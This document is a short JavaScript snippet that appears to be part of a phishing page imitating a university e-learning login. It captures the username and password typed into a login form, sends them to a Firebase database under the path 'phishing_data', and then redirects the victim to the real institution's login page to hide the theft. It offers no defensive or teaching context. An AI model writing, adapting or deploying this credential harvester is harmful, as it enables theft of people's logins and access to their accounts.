<script>
    const firebaseConfig = {
        apiKey: "<YOUR_API_KEY>",
        authDomain: "<YOUR_AUTH_DOMAIN>",
        databaseURL: "<YOUR_DATABASE_URL>",
        projectId: "<YOUR_PROJECT_ID>",
        storageBucket: "<YOUR_STORAGE_BUCKET>",
        messagingSenderId: "<YOUR_MESSAGING_SENDER_ID>",
        appId: "<YOUR_APP_ID>"
    };

    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database(app);

    // Form submission handler
    document.getElementById('login').addEventListener('submit', function(event) {
    event.preventDefault();

    console.log("Event listener attached");

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    console.warn("SECURITY WARNING: Storing passwords directly in the database is extremely insecure.  Use Firebase Authentication instead.");  // Show a warning in the console

    firebase.database().ref('phishing_data').push({
        username: username,
        password: password,
        timestamp: new Date().toISOString()
    }).then(() => {
        console.log("Data written successfully!");
        window.location.href = 'https://elearning.zetech.ac.ke/login/index.php'; // Redirect after successful write
    }).catch((error) => {
        console.error("Error writing data:", error);
    });
});
</script>
